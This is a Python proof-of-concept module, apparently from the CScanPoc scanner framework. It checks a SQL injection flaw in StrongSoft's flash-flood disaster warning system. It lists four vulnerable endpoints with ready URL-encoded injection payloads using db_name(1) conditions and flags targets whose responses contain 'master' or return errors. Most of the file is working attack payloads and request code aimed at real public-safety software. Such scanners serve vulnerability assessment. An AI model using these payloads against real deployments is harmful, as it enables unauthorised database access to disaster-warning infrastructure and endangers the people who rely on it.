# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'StrongSoft_0003'  # 平台漏洞编号，留空
    name = '四创灾害预警系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-04 '  # 漏洞公布时间
    desc = '''
        福建四创软件开发的“山洪灾害预警监测系统”存在SQL注入漏洞，可获取数据库任意数据，进而而导致预警系统沦陷。
        /Public/DataAccess/Water/WaterChartDataProvider.ashx
        /Public/DataAccess/Rain/RainChartDataProvider.ashx
        /Public/DataAccess/GeneralModule/doDbAccess.ashx
        /Report/AjaxHandle/ReportContent/SpecialContent/DataSourceCZYL.ashx
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '四创灾害预警系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4c086d3f-8867-484e-bb10-56e9219b3c3b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-099088
            # refer:http://www.wooyun.org/bugs/wooyun-2010-099084
            # refer:http://www.wooyun.org/bugs/wooyun-2010-099077
            # refer:http://www.wooyun.org/bugs/wooyun-2010-099074
            # refer:http://www.wooyun.org/bugs/wooyun-2010-097446
            # refer:http://www.wooyun.org/bugs/wooyun-2010-097445
            # refer:http://www.wooyun.org/bugs/wooyun-2010-095953
            # refer:http://www.wooyun.org/bugs/wooyun-2010-094994
            # refer:http://www.wooyun.org/bugs/wooyun-2010-094226
            hh = hackhttp.hackhttp()
            payloads = {
                '/Public/DataAccess/Water/WaterChartDataProvider.ashx?dateForAjax=656': 'stcd=63%27%20and%201172%3Ddb_name%281%29%20AND%20%271%27%3D%271&start=2015-01-18 08:00:00&end=2015-01-18 13:00:00',
                '/Public/DataAccess/Rain/RainChartDataProvider.ashx?dateForAjax=200': 'stcd=63%27%20and%201172%3Ddb_name%281%29%20AND%20%271%27%3D%271&start=2015-01-18 08:00:00&end=2015-01-18 13:00:00',
                '/Public/DataAccess/GeneralModule/doDbAccess.ashx?dateForAjax=364': 'params=0125%27%29%20AND%201172%3Ddb_name%281%29%20AND%20%28%271%27%3D%271&sqlkey=Map_S_GetEnnuById_ZWP',
                '/Report/AjaxHandle/ReportContent/SpecialContent/DataSourceCZYL.ashx?_=1421675671108': 'StartTime=2015%E5%B9%B401%E6%9C%8819%E6%97%A508%E6%97%B6&EndTime=2015%E5%B9%B401%E6%9C%8819%E6%97%A522%E6%97%B6&ReportID=Report11&UrlSqlWhere= and stcd in %28%271%27%2C%27104%27%2C%27105%27%2C%27106%27%2C%27107%27%2C%27108%27%2C%27109%27%2C%2711%27%2C%27110%27%2C%27111%27%2C%27112%27%2C%27113%27%2C%27114%27%2C%27115%27%2C%27116%27%2C%27117%27%2C%27118%27%2C%27119%27%2C%27120%27%2C%27121%27%2C%27122%27%2C%27123%27%2C%27124%27%2C%27125%27%2C%27126%27%2C%27127%27%2C%27128%27%2C%27129%27%2C%27131%27%2C%27132%27%2C%27133%27%2C%27134%27%2C%27135%27%2C%27136%27%2C%27137%27%2C%27138%27%2C%27139%27%2C%2714%27%2C%27140%27%2C%27141%27%2C%27142%27%2C%27143%27%2C%27144%27%2C%27145%27%2C%27146%27%2C%27147%27%2C%27148%27%2C%27149%27%2C%2715%27%2C%27150%27%2C%27151%27%2C%27152%27%2C%27153%27%2C%27154%27%2C%27156%27%2C%27157%27%2C%27158%27%2C%2716%27%2C%2717%27%2C%2718%27%2C%272%27%2C%2724%27%2C%2725%27%2C%2726%27%2C%2728%27%2C%2729%27%2C%273%27%2C%2730%27%2C%2733%27%2C%2734%27%2C%2735%27%2C%2737%27%2C%2738%27%2C%2739%27%2C%274%27%2C%2744%27%2C%2746%27%2C%2747%27%2C%2748%27%2C%2750%27%2C%2752%27%2C%2753%27%2C%2754%27%2C%2756%27%2C%2757%27%2C%2758%27%2C%2759%27%2C%2760%27%2C%2761%27%2C%2762%27%2C%2763%27%2C%2764%27%2C%2765%27%2C%2766%27%2C%2769%27%2C%277%27%2C%2770%27%2C%2771%27%2C%2772%27%2C%2773%27%2C%2774%27%2C%2775%27%2C%2776%27%2C%2777%27%2C%2778%27%2C%2779%27%2C%278%27%2C%2780%27%2C%2781%27%2C%2782%27%2C%2783%27%2C%2784%27%2C%2785%27%2C%2786%27%2C%2787%27%2C%2796%27%2C%2797%27%2C%2798%27%29%20AND%207572%3Ddb_name%281%29'
            }
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url, payloads[payload])
                if code == 500 or code == 200 and 'master' in res:
                    #security_hole(url + "\n"+"postdata:"+payloads[payload]+"   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
